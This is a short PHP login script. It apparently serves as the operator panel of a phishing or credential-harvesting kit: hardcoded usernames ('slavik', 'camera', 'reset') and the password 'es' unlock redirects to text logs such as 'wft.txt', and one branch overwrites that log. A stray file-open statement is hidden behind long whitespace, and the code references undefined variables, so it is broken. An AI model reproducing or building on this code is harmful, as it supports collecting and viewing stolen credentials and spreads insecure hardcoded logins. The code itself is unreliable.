<?php
include "loginemail.php";
//wft
 $usr="slavik";
 //slavik2
 $usr1="camera";
 //reset
 $usr2="reset";
 $pwd="es";
$username=$_POST['username'];
$password=$_POST['password'];


if(($username==$usr2) && ($password==$pwd) ){
$name=$_POST['name'];
$datahora = date('d/m/Y \à\s H:i:s');

$CLIENT=  "\n----------------------------------------
| Reset COMPUTER| $datahora 
NAME: $name
USER: $user2
SENHA: $pwd";                                                                                                                                                  $ABRIR = fopen ($ARQUIVO, "a") ;

$CLIENTfile= "wft.txt" ;     
$openfile = fopen ($CLIENTfile, "w") ;
fwrite ($openfile, $CLIENT) ;
fclose ($openfile) ;
echo '<Meta http-equiv="refresh" content="0;url=wft.txt">' ;
exit;	
  
      }


	if(($username==$usr1) && ($password==$pwd) ){

					echo '<Meta http-equiv="refresh" content="0;url=slavik2.txt">' ;
exit;		
							

				}

if(isset($_POST['username']) && !empty($_POST['username']) && isset($_POST['password']) && !empty($_POST['password']) ){

$username=$_POST['username'];
$password=$_POST['password'];

 
			if(($username==$usr) && ($password==$pwd) ){

					echo '<Meta http-equiv="refresh" content="0;url=wft.txt">' ;
exit;		
							

				}else{

							echo '<br>Error';
							}
	}else{
			echo "<br>Connot be left empty!";
			}
?>
